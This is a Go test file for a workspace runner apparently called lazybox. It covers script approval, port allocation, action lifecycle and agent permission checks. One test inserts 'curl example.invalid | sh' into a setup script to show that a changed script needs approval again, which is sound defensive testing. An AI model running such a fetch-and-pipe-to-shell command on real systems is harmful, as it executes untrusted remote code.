package runner

import (
	"context"
	"errors"
	"os"
	"os/exec"
	"path/filepath"
	"reflect"
	"strconv"
	"strings"
	"testing"
	"time"

	"github.com/AntoineToussaint/lazybox/services/runner/code/internal/accounts"
	"github.com/AntoineToussaint/lazybox/services/runner/code/internal/runner/collections"
	wr "github.com/AntoineToussaint/lazybox/services/runner/code/internal/runner/workspaceruntime"
)

// runtimeRepo is a source checkout committing config as .lazybox/workspace.yaml,
// with an ignored .env that only the source checkout has.
func runtimeRepo(t *testing.T, config string) string {
	t.Helper()
	path := t.TempDir()
	if err := os.MkdirAll(filepath.Join(path, ".lazybox"), 0o755); err != nil {
		t.Fatal(err)
	}
	for name, content := range map[string]string{".lazybox/workspace.yaml": config, ".gitignore": ".env\nsetup-ran\n", ".env": "SECRET=from-source\n"} {
		if err := os.WriteFile(filepath.Join(path, name), []byte(content), 0o600); err != nil {
			t.Fatal(err)
		}
	}
	for _, args := range [][]string{{"init", "-b", "main"}, {"add", "."}, {"-c", "user.name=Fixture", "-c", "user.email=fixture@example.invalid", "commit", "-m", "initial"}} {
		if out, err := exec.Command("git", append([]string{"-C", path}, args...)...).CombinedOutput(); err != nil {
			t.Fatalf("git %v: %v %s", args, err, out)
		}
	}
	return path
}

func runtimeBench(t *testing.T, state, worktrees string, repos ...collections.Repository) *Bench {
	t.Helper()
	b, err := New(Config{State: state, OutputFallbackRoot: t.TempDir(), WorktreeRoot: worktrees, Repositories: repos})
	if err != nil {
		t.Fatal(err)
	}
	b.runtime.ports.InUse = func(int) bool { return false }
	return b
}

func runtimeEnvironment(t *testing.T) {
	t.Helper()
	t.Setenv("SHELL", "/bin/sh")
	t.Setenv("HOME", t.TempDir())
	t.Setenv("ENV", "")
}

func waitState(t *testing.T, b *Bench, id string, find func(RuntimeView) string, want string) RuntimeView {
	t.Helper()
	var v RuntimeView
	var got string
	for deadline := time.Now().Add(20 * time.Second); time.Now().Before(deadline); time.Sleep(25 * time.Millisecond) {
		var err error
		if v, err = b.WorkspaceRuntime(context.Background(), id); err != nil {
			t.Fatal(err)
		}
		if got = find(v); got == want {
			return v
		}
	}
	t.Fatalf("state %q, want %q: %+v", got, want, v)
	return v
}

func action(key string) func(RuntimeView) string {
	return func(v RuntimeView) string {
		for _, a := range v.Actions {
			if a.Key == key {
				return a.State.State
			}
		}
		return "missing"
	}
}

func setup(member string) func(RuntimeView) string {
	return func(v RuntimeView) string {
		for _, s := range v.Setups {
			if s.Member == member {
				return s.State.State
			}
		}
		return "missing"
	}
}

func output(t *testing.T, b *Bench, commandID string) string {
	t.Helper()
	c, err := b.Commands.Get(commandID)
	if err != nil {
		t.Fatal(err)
	}
	return string(c.Tail(context.Background(), 1<<16))
}

const setupConfig = `setup: |
  echo "setup on $LAZYBOX_PORT_0 for $LAZYBOX_REPOSITORY in $LAZYBOX_WORKSPACE_NAME" > setup-ran
  cat .env >> setup-ran
files: [.env, missing.local]
actions:
  web:
    run: echo "serving $LAZYBOX_PORT"; while :; do sleep 0.05; done
    url: http://localhost:$LAZYBOX_PORT
`

// A repository's scripts run only once the person approved that exact
// version: before, nothing is copied or run and actions are blocked; after,
// files are copied and setup runs with the workspace's ports. A changed file
// needs approval again, and names what changed.
func TestSetupWaitsForApprovalThenCopiesFilesAndRuns(t *testing.T) {
	runtimeEnvironment(t)
	repo := runtimeRepo(t, setupConfig)
	b := runtimeBench(t, t.TempDir(), t.TempDir(), collections.Repository{ID: "api", Path: repo})
	defer b.Close()
	ctx := context.Background()
	c, err := b.Collections.Create(ctx, "create", collections.Spec{Name: "Login fix", Members: []collections.MemberSpec{{Name: "api", RepositoryID: "api"}}})
	if err != nil {
		t.Fatal(err)
	}
	var progress []string
	if err = b.WorkspaceCreated(ctx, c.ID, []string{"api"}, func(m string) error { progress = append(progress, m); return nil }); err != nil {
		t.Fatal(err)
	}
	if len(progress) != 1 || !strings.Contains(progress[0], "api has workspace scripts to review") {
		t.Fatalf("creation must say the scripts wait for review: %q", progress)
	}
	worktree := c.Members[0].Path
	if _, err = os.Stat(filepath.Join(worktree, ".env")); err == nil {
		t.Fatal("files were copied before approval")
	}
	v, err := b.WorkspaceRuntime(ctx, c.ID)
	if err != nil {
		t.Fatal(err)
	}
	if v.Members[0].Approval != "required" || len(v.Setups) != 1 || !v.Setups[0].PendingApproval || v.Actions[0].Blocked == "" {
		t.Fatalf("unapproved: %+v", v)
	}
	if _, err = b.StartWorkspaceAction(ctx, c.ID, "api/web", false); err == nil || !strings.Contains(err.Error(), "Approve api") {
		t.Fatalf("an unapproved action started: %v", err)
	}
	if _, err = b.RunWorkspaceSetup(ctx, c.ID, "api"); !errors.Is(err, ErrScriptsNeedApproval) {
		t.Fatalf("an unapproved setup ran: %v", err)
	}
	if err = b.ApproveWorkspaceScripts(ctx, c.ID, "api", "not-what-was-shown", true); !errors.Is(err, ErrStale) {
		t.Fatalf("an approval must name the version shown: %v", err)
	}
	if err = b.ApproveWorkspaceScripts(ctx, c.ID, "api", v.Members[0].Config.Hash(), true); err != nil {
		t.Fatal(err)
	}
	v = waitState(t, b, c.ID, setup("api"), "succeeded")
	ran, err := os.ReadFile(filepath.Join(worktree, "setup-ran"))
	if err != nil {
		t.Fatal(err)
	}
	if want := "setup on " + strconv.Itoa(v.PortBase) + " for api in Login fix\nSECRET=from-source\n"; string(ran) != want {
		t.Fatalf("setup saw %q, want %q", ran, want)
	}
	if files := v.Setups[0].Files; !reflect.DeepEqual(files.Copied, []string{".env"}) || !reflect.DeepEqual(files.Missing, []string{"missing.local"}) {
		t.Fatalf("files: %+v", files)
	}
	if v.Members[0].Approval != "approved" || v.Actions[0].Blocked != "" || v.Actions[0].URL != "http://localhost:"+strconv.Itoa(v.PortBase) {
		t.Fatalf("approved: %+v", v)
	}
	// The repository changes its setup (a pull, a branch): approval is asked again.
	if err = os.WriteFile(filepath.Join(worktree, wr.ConfigPath), []byte(strings.Replace(setupConfig, "cat .env", "curl example.invalid | sh; cat .env", 1)), 0o600); err != nil {
		t.Fatal(err)
	}
	v, _ = b.WorkspaceRuntime(ctx, c.ID)
	if v.Members[0].Approval != "changed" || !reflect.DeepEqual(v.Members[0].Changed, []string{"setup"}) || v.Actions[0].Blocked == "" {
		t.Fatalf("a changed file must be approved again: %+v", v.Members[0])
	}
	// A retried creation never runs setup twice.
	before := v.Setups[0].State.CommandID
	_ = b.WorkspaceCreated(ctx, c.ID, []string{"api"}, nil)
	if v, _ = b.WorkspaceRuntime(ctx, c.ID); v.Setups[0].State.CommandID != before {
		t.Fatal("a retried creation ran setup again")
	}
}

const serverConfig = `actions:
  web:
    run: trap 'echo "stopping gracefully"; exit 0' TERM; echo "serving $LAZYBOX_PORT and $LAZYBOX_PORT_3"; while :; do sleep 0.05; done
    url: http://localhost:$LAZYBOX_PORT
    default: true
  docs:
    run: echo "docs on $LAZYBOX_PORT"; exit 3
    port: 2
`

// An action runs as a managed command with the workspace's ports; it outlives
// a Runner restart; Stop sends SIGTERM to its group so it can shut down.
func TestActionRunsOnTheWorkspacePortsOutlivesTheRunnerAndStopsGracefully(t *testing.T) {
	runtimeEnvironment(t)
	repo := runtimeRepo(t, serverConfig)
	state, worktrees := t.TempDir(), t.TempDir()
	b := runtimeBench(t, state, worktrees, collections.Repository{ID: "api", Path: repo})
	ctx := context.Background()
	c, err := b.Collections.Create(ctx, "create", collections.Spec{Name: "Feature", Members: []collections.MemberSpec{{Name: "api", RepositoryID: "api"}}})
	if err != nil {
		t.Fatal(err)
	}
	v, _ := b.WorkspaceRuntime(ctx, c.ID)
	if err = b.ApproveWorkspaceScripts(ctx, c.ID, "api", v.Members[0].Config.Hash(), false); err != nil {
		t.Fatal(err)
	}
	if v.DefaultAction != "api/web" || v.PortBase < wr.DefaultPortStart {
		t.Fatalf("default and ports: %+v", v)
	}
	if _, err = b.StartWorkspaceAction(ctx, c.ID, "api/web", false); err != nil {
		t.Fatal(err)
	}
	v = waitState(t, b, c.ID, action("api/web"), "running")
	web := v.Actions[0]
	for deadline := time.Now().Add(10 * time.Second); !strings.Contains(output(t, b, web.State.CommandID), "serving") && time.Now().Before(deadline); time.Sleep(20 * time.Millisecond) {
	}
	if got, want := output(t, b, web.State.CommandID), "serving "+strconv.Itoa(v.PortBase)+" and "+strconv.Itoa(v.PortBase+3); !strings.Contains(got, want) {
		t.Fatalf("output %q, want %q", got, want)
	}
	// Starting a running action again changes nothing; it is one process.
	if _, err = b.StartWorkspaceAction(ctx, c.ID, "api/web", false); err != nil {
		t.Fatal(err)
	}
	if again, _ := b.WorkspaceRuntime(ctx, c.ID); again.Actions[0].State.CommandID != web.State.CommandID {
		t.Fatal("starting a running action started a second one")
	}
	// An action that picks port 2 of the block, and exits on its own.
	if _, err = b.StartWorkspaceAction(ctx, c.ID, "api/docs", false); err != nil {
		t.Fatal(err)
	}
	v = waitState(t, b, c.ID, action("api/docs"), "failed")
	if docs := v.Actions[1]; docs.Port != v.PortBase+2 || docs.State.ExitCode == nil || *docs.State.ExitCode != 3 || docs.State.LastLine != "docs on "+strconv.Itoa(v.PortBase+2) {
		t.Fatalf("docs: %+v", docs)
	}

	// The Runner restarts: the action keeps running and the next Runner owns it.
	if err = b.Detach(); err != nil {
		t.Fatal(err)
	}
	b = runtimeBench(t, state, worktrees, collections.Repository{ID: "api", Path: repo})
	defer b.Close()
	v = waitState(t, b, c.ID, action("api/web"), "running")
	if v.Actions[0].State.CommandID != web.State.CommandID {
		t.Fatal("the restarted Runner lost the running action")
	}
	if base, _ := b.runtime.ports.Lookup(c.ID); base != v.PortBase {
		t.Fatal("the port block moved across a restart")
	}
	if err = b.StopWorkspaceAction(ctx, c.ID, "api/web"); err != nil {
		t.Fatal(err)
	}
	v = waitState(t, b, c.ID, action("api/web"), "stopped")
	if code := v.Actions[0].State.ExitCode; code == nil || *code != 0 || !strings.Contains(output(t, b, web.State.CommandID), "stopping gracefully") {
		t.Fatalf("Stop must let the action shut down on SIGTERM: %+v %q", v.Actions[0].State, output(t, b, web.State.CommandID))
	}
}

// A non-concurrent action runs in one workspace at a time: starting it stops
// the same repository's action of that name everywhere else. A concurrent
// one runs side by side, each on its own ports.
func TestNonConcurrentActionStopsTheSameActionElsewhere(t *testing.T) {
	runtimeEnvironment(t)
	repo := runtimeRepo(t, `actions:
  web:
    run: echo "web $LAZYBOX_PORT"; while :; do sleep 0.05; done
    concurrent: false
  worker:
    run: while :; do sleep 0.05; done
`)
	b := runtimeBench(t, t.TempDir(), t.TempDir(), collections.Repository{ID: "api", Path: repo})
	defer b.Close()
	ctx := context.Background()
	ids := []string{}
	for _, name := range []string{"Alpha", "Beta"} {
		c, err := b.Collections.Create(ctx, name, collections.Spec{Name: name, Members: []collections.MemberSpec{{Name: "api", RepositoryID: "api"}}})
		if err != nil {
			t.Fatal(err)
		}
		ids = append(ids, c.ID)
	}
	v, _ := b.WorkspaceRuntime(ctx, ids[0])
	if err := b.ApproveWorkspaceScripts(ctx, ids[0], "api", v.Members[0].Config.Hash(), false); err != nil {
		t.Fatal(err)
	}
	for _, id := range ids {
		for _, key := range []string{"api/web", "api/worker"} {
			if _, err := b.StartWorkspaceAction(ctx, id, key, false); err != nil && id == ids[0] {
				t.Fatal(err)
			}
		}
	}
	// Starting web in Beta stopped it in Alpha; worker runs in both.
	alpha := waitState(t, b, ids[0], action("api/web"), "stopped")
	beta := waitState(t, b, ids[1], action("api/web"), "running")
	waitState(t, b, ids[0], action("api/worker"), "running")
	waitState(t, b, ids[1], action("api/worker"), "running")
	if alpha.PortBase == beta.PortBase {
		t.Fatal("two workspaces share a port block")
	}
	// Alpha shows where web runs now; starting it again moves it back.
	if got := alpha.Actions[0].RunningElsewhere; !reflect.DeepEqual(got, []string{"Beta"}) {
		t.Fatalf("running elsewhere: %v", got)
	}
	stopped, err := b.StartWorkspaceAction(ctx, ids[0], "api/web", false)
	if err != nil {
		t.Fatal(err)
	}
	if len(stopped) != 1 || stopped[0].WorkspaceName != "Beta" || stopped[0].Action != "api/web" {
		t.Fatalf("stopped elsewhere: %+v", stopped)
	}
	waitState(t, b, ids[1], action("api/web"), "stopped")
	waitState(t, b, ids[0], action("api/web"), "running")
}

// Deleting a workspace stops its actions, runs the archive script while the
// worktree still exists, and frees the port block.
func TestArchiveRunsBeforeDeletionAndThePortBlockIsFreed(t *testing.T) {
	runtimeEnvironment(t)
	marker := filepath.Join(t.TempDir(), "archived")
	t.Setenv("ARCHIVE_MARKER", marker)
	repo := runtimeRepo(t, `archive: echo "archived $LAZYBOX_WORKSPACE_NAME from $(basename "$PWD")" > "$ARCHIVE_MARKER"
actions:
  web: while :; do sleep 0.05; done
`)
	b := runtimeBench(t, t.TempDir(), t.TempDir(), collections.Repository{ID: "api", Path: repo})
	defer b.Close()
	ctx := context.Background()
	c, err := b.Collections.Create(ctx, "create", collections.Spec{Name: "Disposable", Members: []collections.MemberSpec{{Name: "api", RepositoryID: "api"}}})
	if err != nil {
		t.Fatal(err)
	}
	v, _ := b.WorkspaceRuntime(ctx, c.ID)
	if err = b.ApproveWorkspaceScripts(ctx, c.ID, "api", v.Members[0].Config.Hash(), false); err != nil {
		t.Fatal(err)
	}
	if _, err = b.StartWorkspaceAction(ctx, c.ID, "api/web", false); err != nil {
		t.Fatal(err)
	}
	v = waitState(t, b, c.ID, action("api/web"), "running")
	web, _ := b.Commands.Get(v.Actions[0].State.CommandID)
	deleting, cancel := context.WithTimeout(ctx, 30*time.Second)
	defer cancel()
	if _, err = b.DeleteWorkspace(deleting, c.ID, c.Name, true, true, false); err != nil {
		t.Fatal(err)
	}
	if !web.Status().Done {
		t.Fatal("an action kept running in a deleted workspace")
	}
	got, err := os.ReadFile(marker)
	if err != nil || string(got) != "archived Disposable from api\n" {
		t.Fatalf("archive: %q %v", got, err)
	}
	if _, ok := b.runtime.ports.Lookup(c.ID); ok {
		t.Fatal("a deleted workspace kept its port block")
	}
}

// An agent lists and starts actions through its command tool only when its
// session may run commands; approving and stopping stay the person's.
func TestAgentStartsAnActionOnlyWhenItsPermissionAllows(t *testing.T) {
	runtimeEnvironment(t)
	repo := runtimeRepo(t, serverConfig)
	b := runtimeBench(t, t.TempDir(), t.TempDir(), collections.Repository{ID: "api", Path: repo})
	defer b.Close()
	ctx := context.Background()
	c, err := b.Collections.Create(ctx, "create", collections.Spec{Name: "Feature", Members: []collections.MemberSpec{{Name: "api", RepositoryID: "api"}}})
	if err != nil {
		t.Fatal(err)
	}
	readOnly := &Execution{CollectionID: c.ID, Options: accounts.Options{Permission: "read-only"}}
	planning := &Execution{CollectionID: c.ID, Options: accounts.Options{Workflow: "plan"}}
	coding := &Execution{CollectionID: c.ID, Options: accounts.Options{Permission: "ask"}}
	if _, err = b.agentAction(ctx, coding, "start_action", "web", false); err == nil || !strings.Contains(err.Error(), "Approve api") {
		t.Fatalf("an agent started unapproved scripts: %v", err)
	}
	v, _ := b.WorkspaceRuntime(ctx, c.ID)
	if err = b.ApproveWorkspaceScripts(ctx, c.ID, "api", v.Members[0].Config.Hash(), false); err != nil {
		t.Fatal(err)
	}
	for _, e := range []*Execution{readOnly, planning, {Options: accounts.Options{Permission: "yolo"}}} {
		if _, err = b.agentAction(ctx, e, "start_action", "web", false); err == nil {
			t.Fatalf("%+v started an action", e.Options)
		}
	}
	listed, err := b.agentAction(ctx, readOnly, "actions", "", false)
	if err != nil {
		t.Fatal(err)
	}
	if list := listed.([]agentActionView); len(list) != 2 || list[0].Name != "api/web" || !list[0].Default || list[0].URL == "" {
		t.Fatalf("a read-only agent may list actions: %+v", list)
	}
	if _, err = b.agentAction(ctx, coding, "start_action", "", false); err != nil {
		t.Fatal(err)
	}
	waitState(t, b, c.ID, action("api/web"), "running")
	if _, err = b.agentAction(ctx, coding, "start_action", "nope", false); !errors.Is(err, os.ErrNotExist) {
		t.Fatalf("an unknown action: %v", err)
	}
}

// Exercise the repository's real build action from a conversation. A dirty
// fixture home must produce both outcomes without reaching either launcher.
func TestManagedBuildActionUsesApprovedHomeAndRoot(t *testing.T) {
	runtimeEnvironment(t)
	root := t.TempDir()
	t.Setenv("LAZYBOX_V2_ENVIRONMENTS", root)
	config, err := os.ReadFile("../../../../../.lazybox/workspace.yaml")
	if err != nil {
		t.Fatal(err)
	}
	repo := runtimeRepo(t, string(config))
	b := runtimeBench(t, t.TempDir(), t.TempDir(), collections.Repository{ID: "lazybox", Path: repo})
	defer b.Close()
	ctx := context.Background()
	c, err := b.Collections.Create(ctx, "create", collections.Spec{Name: "Build", Members: []collections.MemberSpec{{Name: "lazybox", RepositoryID: "lazybox"}}})
	if err != nil {
		t.Fatal(err)
	}
	script, err := os.ReadFile("../../../../../scripts/managed-build.mjs")
	if err != nil {
		t.Fatal(err)
	}
	dir := filepath.Join(c.Members[0].Path, "scripts")
	if err := os.Mkdir(dir, 0o700); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(dir, "managed-build.mjs"), script, 0o600); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(repo, "local-edit"), []byte("keep"), 0o600); err != nil {
		t.Fatal(err)
	}
	e := &Execution{ID: "requester", CollectionID: c.ID, Previous: "earlier"}
	start := func(key string) error {
		_, err := b.agentAction(ctx, e, "start_action", key, false)
		return err
	}
	builds := []struct{ key, channel string }{
		{"lazybox/rebuild-dev", "Dev"},
		{"lazybox/stage-working", "Working"},
	}
	for _, build := range builds {
		if err := start(build.key); err == nil {
			t.Fatalf("%s started before approval", build.key)
		}
	}
	view, err := b.WorkspaceRuntime(ctx, c.ID)
	if err != nil {
		t.Fatal(err)
	}
	if err := b.ApproveWorkspaceScripts(ctx, c.ID, "lazybox", view.Members[0].Config.Hash(), false); err != nil {
		t.Fatal(err)
	}
	for _, build := range builds {
		if err := start(build.key); err != nil {
			t.Fatal(err)
		}
		view = waitState(t, b, c.ID, action(build.key), "failed")
		var commandID string
		for _, a := range view.Actions {
			if a.Key == build.key {
				commandID = a.State.CommandID
			}
		}
		log, err := b.toolWithEnv(ctx, e, "lazybox_command", []byte(`{"action":"read","id":"`+commandID+`"}`), nil)
		if err != nil {
			t.Fatal(err)
		}
		if _, err := b.toolWithEnv(ctx, e, "lazybox_command", []byte(`{"action":"cancel","id":"`+commandID+`"}`), nil); err == nil {
			t.Fatal("reading the action must not grant cancellation")
		}
		for _, other := range builds {
			if other.key != build.key && strings.Contains(log, "["+other.channel+"] skipped:") {
				t.Fatalf("%s also attempted %s", build.key, other.channel)
			}
		}
		if !strings.Contains(log, "["+build.channel+"] skipped: Repository home must be a clean checkout") {
			t.Fatalf("missing %s outcome in %q", build.channel, log)
		}
	}
}
